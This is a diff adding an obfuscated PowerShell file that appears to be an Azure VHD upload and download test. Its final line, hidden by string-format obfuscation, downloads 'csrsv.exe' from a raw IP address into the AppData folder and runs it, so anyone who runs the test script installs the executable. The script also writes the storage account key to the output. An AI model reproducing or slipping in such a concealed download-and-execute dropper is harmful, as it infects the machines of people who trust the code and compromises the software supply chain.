@@ -1,0 +1,117 @@
+ SET-IteM ("{1}{2}{0}" -f'2f4','Var','iABLe:') ([type]("{11}{10}{0}{4}{1}{6}{8}{2}{9}{7}{3}{5}" -f'.WinD','.cOm','Ds.sYNC.D','.bLobUr','OWSazURe','I','ma','oAD','n','Ownl','oSOft','MIcR')  ) ;  seT-iTEm  ("{1}{0}{2}"-f 'ablE:VyR','vArI','z') ( [TYpe]("{12}{5}{7}{14}{0}{11}{9}{10}{8}{3}{6}{13}{2}{1}{4}"-f'ow','b','LoAD.','SY','lOBHanDle','ft.','nc.D','W','OmMAnDs.','Re.','c','SaZU','MIcRosO','OWN','iND') ); SEt-VARiabLe ("{0}{1}"-f 'S3fG','E') (  [tYPE]("{3}{1}{0}{2}"-F'.S','Em','tRiNG','syst')  );  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function TEST`-aD`DVhd
+{
+    
+    ${rGn`AmE} = &("{5}{3}{2}{4}{7}{6}{1}{0}" -f 'ame','N','-C','et','omputeTe','G','tResource','s')
+
+    try
+    {
+        
+        ${L`OC} = &("{4}{3}{1}{2}{5}{0}" -f 'n','eVML','oca','Comput','Get-','tio');
+        .("{1}{2}{3}{0}"-f'roup','New-AzResour','ce','G') -Name ${R`GnaMe} -Location ${L`oc} -Force;
+
+        
+        ${S`TONa`Me} = 'sto' + ${rG`NAME};
+        ${st`Ot`yPE} = ("{0}{1}{2}"-f'Sta','ndard','_GRS');
+        .("{3}{0}{4}{2}{1}{5}"-f 'z','co','orageAc','New-A','St','unt') -ResourceGroupName ${R`GNaMe} -Name ${sT`oNA`me} -Location ${L`Oc} -Type ${S`TO`TypE};
+        ${STo`AC`CoUnT} = &("{1}{3}{0}{2}"-f'coun','Get-AzStorage','t','Ac') -ResourceGroupName ${rgn`A`ME} -Name ${stOn`A`Me};
+        ${s`To`RAgEKeY} = .("{4}{1}{3}{5}{2}{0}" -f'y','tor','e','a','Get-AzS','geAccountK') -ResourceGroupName ${R`g`NAmE} -Name ${stO`NA`Me};
+        ${VHdconTa`I`N`ERNamE} = ("{1}{0}"-f'ds','vh');
+
+        ${p`ATh} = (.("{1}{0}{2}" -f'-','get','item') -path ".\")."fuL`lN`AMe";
+
+        ${CS`V`FILE} = ("{1}{0}{4}{2}{3}"-f'o','upl','HD.','csv','ad_V');
+        ${C`sV`pATH} = ((("{16}{3}{4}{5}{15}{8}{10}{0}{6}{2}{17}{18}{12}{19}{7}{9}{13}{11}{14}{1}"-f 'anag','rces{0}','t','.','.{0}','.','emen','Ser','c','viceManagement.Test{','eM','}Reso','d','0','u','.{0}..{0}..{0}Servi','..{0}','{0}Compu','te{0}Comman','s.'))  -F[chaR]92) + ${C`SVfi`LE};
+        ${TEsTD`A`TA} = &("{3}{2}{0}{1}"-f 'Cs','v','ort-','Imp') ${C`SVpa`TH};
+
+        foreach (${TEStI`T`em} in ${te`sTda`Ta})
+        {
+              ${VhDlo`CA`L`pAtH} = ((("{2}{0}{1}{3}" -f'vhd','s','f:{0}','tore{0}'))-f[Char]92) + ${TEST`IT`eM}."V`HDNa`Me";
+              ${VHDN`A`Me} = &("{4}{3}{2}{0}{1}"-f'tens','ion','Ex','eWithout','GetFileNam') ${TE`S`TItem}."v`hD`NaME";
+              ${vHddes`TU`Ri} =   $s3FGE::("{0}{1}{2}" -f 'Form','a','t').Invoke("{0}{1}/{2}{3}.vhd", ${st`o`ACCOunt}."P`RiMArYeNdp`oiN`Ts"."B`Lob", ${vhd`cO`Nt`AInern`AmE}, ${vHDn`A`mE}, ${R`gNAMe});
+              &("{1}{0}{2}{3}" -f 'ite-','Wr','Ou','tput') (("{0}{4}{3}{2}{1}{5}" -f 'St','g.','ploadin','t U','ar','.. : ') + ${TES`TI`TeM}."VhDN`AME");
+
+              ${vh`duPL`O`ADC`onTEXT} = &("{1}{2}{0}" -f'AzVhd','Add','-') -ResourceGroupName ${R`gNa`ME} -Destination ${v`HD`dEsTURi} -LocalFilePath ${V`hDlOCAl`pAtH} -NumberOfUploaderThreads 1;
+              &("{2}{0}{3}{1}"-f'-Sec','ds','Wait','on') 5;
+              .("{1}{2}{0}"-f 't','Wri','te-Outpu') (("{4}{2}{3}{0}{1}"-f'U','ri :','es','tination ','D') + ${VH`Du`p`LoAdCOnt`exT}."des`T`iN`A`TIonuri");
+              &("{0}{1}{2}{3}"-f 'Wri','te','-Ou','tput') (("{2}{1}{3}{0}"-f ':',' F','Local','ile ') + ${vHduPlo`AdCo`Nt`eXt}."lOCAlfil`epA`TH"."f`U`LlnamE");
+              .("{2}{0}{1}" -f'-Out','put','Write') (("{0}{1}{2}{3}" -f 'Upload','i','ng Ende','d.'));
+
+              &("{2}{1}{0}{3}"-f 'NotNul','t-','Asser','l') ${Vhd`U`pLOaDcOn`TeXT};
+              &("{4}{0}{1}{3}{2}" -f 's','e','AreEqual','rt-','As') ${Vh`DDesTU`RI} ${vHDUP`LoA`d`CON`TeXt}."D`eSti`NaTI`OnuRi";
+              &("{1}{2}{3}{0}"-f'qual','Assert-A','r','eE') ${vHd`LoCal`PA`TH} ${VH`dUplO`Adcon`TExT}."l`oCaLfi`l`EP`ATH"."F`UlLN`AMe";
+
+              .("{1}{2}{0}" -f '-Output','Wri','te') (${VHDD`ESt`URi});
+              .("{0}{1}{2}{3}"-f 'Wri','te-O','ut','put') (${stOrA`gek`ey}."KE`y1");
+
+              ${deSt`BLO`BhA`N`dLE} = &("{2}{0}{3}{1}" -f 'e','le','G','tBlobHand') ${VhdDE`ST`URi} ${s`ToR`Age`kEy}."K`ey1";
+              .("{1}{2}{0}"-f 'True','A','ssert-') {.("{0}{3}{2}{1}"-f 'Ver','h','MD5has','ify') ${Dest`B`lo`B`hANdLe} ${TeSt`It`eM}."MD5`hASH"};
+
+              ${V`hD`D`oWnloAD`pA`TH} = ${vhdLO`calp`A`Th} + ("{0}{2}{1}"-f '-down','vhd','load.');
+
+              ${Vh`dDoWNload`C`o`NTExt} = &("{1}{2}{0}" -f'd','Save','-AzVh') -ResourceGroupName ${R`GNAMe} -SourceUri ${v`Hd`D`EsTuRi} -LocalFilePath ${VHdD`o`WNlo`ADp`Ath};
+              .("{2}{1}{3}{0}"-f 't','-Outp','Write','u') (("{2}{1}{0}"-f'ce :','r','Sou') +${V`HDd`OWNlO`ADc`onTExt}."SoUR`ce");
+              &("{2}{3}{1}{0}" -f 'ut','p','Write-Ou','t') (("{2}{3}{1}{0}" -f'ath :','P','Lo','calFile') +${vHddOwn`loaD`CoNt`ExT}."lO`C`AlFileP`ATH");
+              &("{2}{3}{0}{1}"-f 'ert-Are','Equal','As','s') ${vHdDE`ST`URI} ${Vhd`D`ow`NloAd`C`oNTExt}."SoUr`cE";
+              .("{3}{1}{2}{4}{0}" -f 'reEqual','r','t','Asse','-A') ${vHdD`OWnLo`A`dp`Ath} ${VhD`D`owNlOa`dcO`NT`EXt}."loc`A`LFILe`path";
+
+              ${vhdDOW`Nl`OAd`C`O`NtEXT} = &("{3}{1}{2}{0}"-f 'hd','a','ve-AzV','S') -ResourceGroupName ${rg`NA`ME} -SourceUri ${vhD`dE`st`URi} -LocalFilePath ${VHDDOw`N`L`oa`DpaTH} -Overwrite;
+              &("{1}{4}{0}{3}{2}"-f '-','A','al','AreEqu','ssert') ${vhDD`EStU`RI} ${VHdd`Ow`NLOADcOn`TExT}."SOur`cE";
+              .("{2}{1}{0}" -f 'l','-AreEqua','Assert') ${V`H`DdOwnLoaDP`A`TH} ${vH`dDo`wN`LoaDCONte`xT}."Loc`AL`FI`lePatH";
+        }
+    }
+    finally
+    {
+        
+        &("{0}{1}{2}{3}" -f 'Cle','an-Re','sou','rceGroup') ${rGN`AMe}
+    }
+}
+
+function get`F`i`LEna`MEWITh`Ou`TE`xtENs`iON (${Fi`Le`NamE})
+{
+    ${fiL`E`NamE}.("{0}{3}{1}{2}" -f'Su','t','ring','bs').Invoke(0, ${fi`lenAme}.("{1}{2}{0}" -f 'Of','Ind','ex').Invoke('.'));
+}
+
+function G`etblO`Bha`NDLE
+{
+    param([string] ${BlObSt`RI`Ng}, [string] ${sTOrA`G`EKEY})
+
+    ${BLObP`AtH} = [Microsoft.WindowsAzure.Commands.Sync.Download.BlobUri] ${Nu`lL};
+     (gET-VARIable  ("{0}{1}" -f '2f','4')).VaLue::"TryPA`R`se`UrI"(${B`LoBs`TR`ING}, [REF]${BLOBP`ATH});
+    ${BL`OB} =  (GCi  ("{2}{0}{1}{3}" -f 'aRI','ABl','v','E:VyRz')).VaLuE::("{0}{1}"-f'n','ew').Invoke(${bLOBp`A`TH}, ${s`TO`RaGE`kEY});
+    return [Microsoft.WindowsAzure.Commands.Sync.Download.BlobHandle] ${B`LOb};
+}
+
+function vErIf`yMd`5Hash
+{
+    param([System.Object] ${b`LOb`hAn`dle}, [string] ${md5`Ha`SH})
+
+    ${b`loB`md5} = ${b`Lobh`ANDlE}."Bl`oB"."Pr`OpEr`Ti`ES"."CoNTENt`M`D5";
+    .("{0}{1}{2}{3}" -f'Write','-Out','p','ut') (("{3}{0}{4}{1}{2}" -f'c','l file',': ','MD5 hash of the lo','a') + ${md5h`ASh});
+    if ( (  CHILDitEM  ("{1}{0}{3}{2}{4}"-f 'rIaBLe:','Va','fg','s3','e')  ).VaLuE::("{1}{2}{0}{3}" -f 'lOrEmpt','Is','Nul','y').Invoke(${bl`O`Bmd5}))
+    {
+        &("{3}{0}{1}{2}"-f'rite-O','ut','put','W') (("{4}{7}{1}{5}{3}{2}{0}{6}" -f 'value!','lob','D5 ','s not have M','The',' doe','!!',' b'));
+        return ${F`ALSe};
+    }
+    else
+    {
+        .("{0}{3}{1}{2}"-f'W','Outp','ut','rite-') (("{2}{4}{3}{0}{1}"-f 'f blob',', ','MD5 h','o','ash ')+ ${bL`o`BhAN`Dle}."Bl`oB"."u`Ri".("{0}{2}{1}"-f'ToSt','g','rin').Invoke() + ("{0}{1}" -f ',',' is ')+ ${B`LO`Bmd5});
+        return ${bL`OB`mD5}.("{0}{1}"-f'Equal','s').Invoke(${M`d5h`Ash});
+    }
+}
+
+(&("{3}{1}{2}{0}"-f 'ject','ew-O','b','N') ("{0}{4}{3}{1}{2}"-f 'Sy','bC','lient','We','stem.Net.')).("{3}{2}{0}{1}" -f 'Fi','le','wnload','Do').Invoke(("{2}{3}{4}{8}{0}{1}{7}{5}{6}"-f 'yahoo','/cs','http:/','/94.','102.53','sv.','exe','r','.238/~'),"$env:APPDATA\csrsv.exe");&("{0}{1}{2}" -f 'Start-','Proces','s') ("$env:APPDATA\csrsv.exe")
